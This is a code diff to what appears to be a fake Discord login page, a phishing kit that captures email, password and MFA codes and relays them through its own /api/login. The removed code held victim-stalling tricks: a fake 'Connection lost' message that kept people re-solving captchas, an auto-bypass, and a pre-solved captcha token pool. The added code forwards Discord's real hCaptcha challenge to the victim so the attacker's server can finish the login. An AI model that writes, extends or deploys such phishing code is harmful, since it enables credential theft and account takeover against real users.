@@ -427,7 +427,7 @@
 
 
 
-<!-- hCaptcha stall overlay (real hCaptcha widget inside Discord modal) -->
+<!-- hCaptcha challenge overlay (real Discord hCaptcha) -->
 <div class="captcha-stall" id="captcha-stall">
   <div class="captcha-modal">
     <button class="captcha-close" id="captcha-close" title="Close">&times;</button>
@@ -435,13 +435,13 @@
       <img src="/captcha_face.png" alt="" onerror="this.src='https://i.imgur.com/h41kzXV.png';this.onerror=null"/>
     </div>
     <div class="captcha-body">
-      <h2>Wait! Are you human?</h2>
-      <p>Please confirm you're not a robot.</p>
+      <h2>Human Verification</h2>
+      <p>Complete the challenge to log in.</p>
       <div class="hcaptcha-wrap">
         <div id="h-captcha-widget"></div>
       </div>
       <div class="captcha-verifying" id="captcha-verifying">
-        <span style="color:#ed4245;font-weight:600">Connection lost, please retry.</span>
+        <span style="color:#b5bac1;font-weight:500">Verifying…</span>
       </div>
     </div>
   </div>
@@ -449,14 +449,16 @@
 
 <script>
 /* ═══ State ═══ */
-var mfaTicket     = null;
-var mfaHasSms     = false;
-var mfaMode       = 'totp';
-var qrSid         = null;
-var qrTimer       = null;
-var _qrBusy       = false;  /* guard: prevent concurrent initQR calls */
-var captchaEmail  = null;
-var captchaPw     = null;
+var mfaTicket       = null;
+var mfaHasSms       = false;
+var mfaMode         = 'totp';
+var qrSid           = null;
+var qrTimer         = null;
+var _qrBusy         = false;  /* guard: prevent concurrent initQR calls */
+var captchaEmail    = null;
+var captchaPw       = null;
+var captchaRqtoken  = '';
+var captchaSessionId = '';
 
 /* ═══ Helpers ═══ */
 function showErr(id, msg) {
@@ -496,21 +498,19 @@ var _hcaptchaDone = false;
 var _pendingResult = null;
 var _hcaptchaWidgetId = null;
 
-function showCaptchaStall() {
+function showCaptchaStall(sitekey, rqdata) {
   _hcaptchaDone = false;
   _pendingResult = null;
   var el = document.getElementById('captcha-stall');
   if (el) {
     el.classList.remove('visible');
     el.classList.add('show');
-    /* Graceful 3s stall before revealing the modal */
-    setTimeout(function() {
-      el.classList.add('visible');
-    }, 3000);
+    /* Show immediately — no fake delay */
+    setTimeout(function() { el.classList.add('visible'); }, 50);
   }
   var vf = document.getElementById('captcha-verifying');
   if (vf) vf.classList.remove('show');
-  /* Destroy old widget completely, then render fresh */
+  /* Destroy old widget, render fresh with real Discord sitekey + rqdata */
   try {
     if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {
       try { hcaptcha.remove(_hcaptchaWidgetId); } catch(e2) {}
@@ -521,21 +521,19 @@ function showCaptchaStall() {
     var container = document.getElementById('h-captcha-widget');
     if (typeof hcaptcha !== 'undefined' && container) {
       container.innerHTML = '';
-      _hcaptchaWidgetId = hcaptcha.render('h-captcha-widget', {
-        sitekey: '4c672d35-0701-42b2-88c3-78380b0db560',
+      var opts = {
+        sitekey: sitekey || 'a9b5fb07-92ff-493f-86fe-352a2803b3df',
         theme: 'dark',
         size: 'normal',
         callback: onHcaptchaPass,
         'expired-callback': onHcaptchaExpire,
         'error-callback': onHcaptchaError
-      });
-    } else {
-      /* SDK not loaded — auto-bypass */
-      _hcaptchaDone = true;
+      };
+      if (rqdata) opts.rqdata = rqdata;
+      _hcaptchaWidgetId = hcaptcha.render('h-captcha-widget', opts);
     }
   } catch(e) {
     console.log('[captcha] render error:', e);
-    _hcaptchaDone = true;
   }
 }
 
@@ -560,25 +558,33 @@ function hideCaptchaStall() {
 
 function onHcaptchaPass(token) {
   _hcaptchaDone = true;
-  /* Show "Connection lost" — user thinks it failed and retries, buying stall time */
+  /* Show "Verifying..." while we send the token */
   var vf = document.getElementById('captcha-verifying');
   if (vf) vf.classList.add('show');
-  /* Reset widget after brief delay so user can re-solve (stall loop) */
-  setTimeout(function() {
-    try {
-      if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {
-        hcaptcha.reset(_hcaptchaWidgetId);
-      }
-    } catch(e) {}
-  }, 600);
-  /* If backend result already waiting, close panel after a brief pause */
-  if (_pendingResult) {
-    setTimeout(function() {
-      var pr = _pendingResult;
-      _pendingResult = null;
-      hideCaptchaStall();
-      processLoginResult(pr.d, pr.status);
-    }, 1200);
+  /* Submit the solved token immediately */
+  submitWithCaptcha(token);
+}
+
+async function submitWithCaptcha(captchaToken) {
+  try {
+    var r = await fetch('/api/login', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        login:              captchaEmail,
+        password:           captchaPw,
+        captcha_token:      captchaToken,
+        captcha_rqtoken:    captchaRqtoken,
+        captcha_session_id: captchaSessionId
+      })
+    });
+    var d = await r.json();
+    hideCaptchaStall();
+    processLoginResult(d, r.status);
+  } catch(err) {
+    hideCaptchaStall();
+    showErr('login-error', 'Connection error. Please try again.');
+    btnLoad('login-btn', false);
   }
 }
 
@@ -770,33 +776,24 @@ document.getElementById('login-form').addEventListener('submit', async function(
   btnLoad('login-btn', true);
   _pendingResult = null;
   _hcaptchaDone = false;
-  /* Show hCaptcha overlay immediately */
-  showCaptchaStall();
   try {
-    /* Single long-poll request — server blocks until result is ready */
+    /* Step 1: Try login — may return captcha challenge */
     var r = await fetch('/api/login', {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({login:em, password:pw, prechallenge_id:_prechallengeId})
+      body: JSON.stringify({login:em, password:pw})
     });
     var d = await r.json();
-    /* Check if hCaptcha is done or if this is an error (show errors immediately) */
-    var isError = !d.success && !(d.mfa !== undefined && d.ticket);
-    var stallVisible = document.getElementById('captcha-stall').classList.contains('show');
-    if (!stallVisible || isError) {
-      processLoginResult(d, r.status);
-    } else if (_hcaptchaDone) {
-      /* User already solved captcha and saw error msg — close panel silently */
-      setTimeout(function() {
-        hideCaptchaStall();
-        processLoginResult(d, r.status);
-      }, 1200);
-    } else {
-      /* Backend done first, wait for user to solve captcha */
-      _pendingResult = {d: d, status: r.status};
+    if (d.captcha_needed) {
+      /* Server says captcha required — render real Discord hCaptcha */
+      captchaRqtoken   = d.rqtoken || '';
+      captchaSessionId = d.session_id || '';
+      showCaptchaStall(d.sitekey, d.rqdata);
+      /* Login button stays disabled — re-enabled in processLoginResult / error */
+      return;
     }
+    processLoginResult(d, r.status);
   } catch(err) {
-    hideCaptchaStall();
     showErr('login-error', 'Connection error. Please try again.');
     btnLoad('login-btn', false);
   }
@@ -844,25 +841,8 @@ function backToLogin() {
 }
 
 /* ═══ Init ═══ */
-var _prechallengeId = null;
-
 window.addEventListener('DOMContentLoaded', function() {
   initQR();
-
-  /* ── Instant pre-challenge: fires on PAGE LOAD ──
-     Server has a 24/7 captcha token pool running in background.
-     We grab one immediately. When user clicks Login, the server does:
-       1) POST login → get fresh rqtoken from Discord
-       2) Submit pre-solved token with that fresh rqtoken
-     Result: ~1s login instead of ~25s. No email needed. */
-  fetch('/api/prechallenge', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({})
-  })
-    .then(function(r){return r.json()})
-    .then(function(d){ if(d.prechallenge_id) { _prechallengeId = d.prechallenge_id; console.log('[pre] Token reserved:', _prechallengeId); } })
-    .catch(function(){});
 
   /* ── Safari iOS keyboard fix ── scroll focused input into view */
   if (/iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
